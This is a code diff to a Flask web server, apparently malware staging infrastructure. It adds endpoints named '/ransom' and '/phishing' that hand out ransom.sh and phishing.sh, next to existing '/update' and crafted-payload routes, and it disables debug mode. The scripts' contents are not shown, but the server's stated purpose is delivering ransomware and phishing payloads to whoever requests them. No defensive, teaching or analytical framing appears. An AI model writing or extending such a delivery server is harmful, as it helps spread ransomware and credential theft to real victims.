@@ -10,6 +10,15 @@ api = Api(app)
 HTTP_PORT = 8080
 HOST = '0.0.0.0'
 
+class getPhishing(Resource):
+    def get(self):
+        return send_file('.\\Assets\\phishing.sh')
+
+
+class getRansomware(Resource):
+    def get(self):
+        return send_file('.\\Assets\\ransom.sh')
+
 
 class getUpdate(Resource):
     def get(self):
@@ -25,11 +34,13 @@ class getCraftedPayload(Resource):
 
 
 api.add_resource(getUpdate, '/update')
+api.add_resource(getRansomware,'/ransom')
+api.add_resource(getPhishing,'/phishing')
 api.add_resource(getCraftedPayload, '/<path>')
 
 
 def startHTTPServer():
-    app.run(debug=True, port=HTTP_PORT, host=HOST)
+    app.run(port=HTTP_PORT, host=HOST)
 
 
 if __name__ == '__main__':
